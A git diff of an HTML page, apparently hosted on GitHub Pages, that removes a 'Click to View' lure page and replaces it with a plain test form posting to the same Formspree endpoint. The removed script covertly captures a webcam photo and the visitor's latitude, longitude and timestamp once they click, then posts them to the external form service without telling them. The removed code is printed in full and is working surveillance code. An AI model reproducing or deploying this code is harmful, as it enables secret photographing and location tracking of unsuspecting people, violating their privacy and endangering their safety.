@@ -1,86 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title></title>
-</head>
-
-<body style="
-  margin:0;
-  height:100vh;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  background:#fff;
-">
-
-<form id="form"
-      method="POST"
-      action="https://formspree.io/f/xlgdqobv"
-      enctype="multipart/form-data">
-
-  <button type="button" id="btn"
-    style="
-      padding:16px 28px;
-      font-size:16px;
-      background:black;
-      color:white;
-      border:none;
-      border-radius:6px;
-      cursor:pointer;
-    ">
-    Click to View
-  </button>
-
-</form>
-
-<video id="video" autoplay playsinline hidden></video>
-<canvas id="canvas" hidden></canvas>
-
-<script>
-const btn = document.getElementById("btn");
-const form = document.getElementById("form");
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
-
-btn.onclick = async () => {
-  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-  video.srcObject = stream;
-
-  navigator.geolocation.getCurrentPosition(pos => {
-
-    setTimeout(() => {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext("2d").drawImage(video, 0, 0);
-
-      canvas.toBlob(blob => {
-        const photo = document.createElement("input");
-        photo.type = "file";
-        photo.name = "photo";
-        photo.files = new DataTransfer().files;
-
-        const dt = new DataTransfer();
-        dt.items.add(new File([blob], "selfie.jpg", { type: "image/jpeg" }));
-        photo.files = dt.files;
-
-        form.appendChild(photo);
-
-        form.innerHTML += `
-          <input type="hidden" name="latitude" value="${pos.coords.latitude}">
-          <input type="hidden" name="longitude" value="${pos.coords.longitude}">
-          <input type="hidden" name="accuracy" value="${pos.coords.accuracy}">
-          <input type="hidden" name="time" value="${new Date().toISOString()}">
-        `;
-
-        stream.getTracks().forEach(t => t.stop());
-        form.submit(); // 🔴 REAL POST
-      }, "image/jpeg");
-
-    }, 700);
-  });
-};
-</script>
-
-</body>
+  <body>
+    <form method="POST" action="https://formspree.io/f/xlgdqobv">
+      <input type="text" name="test" value="hello from github pages">
+      <button type="submit">Send</button>
+    </form>
+  </body>
 </html>
+
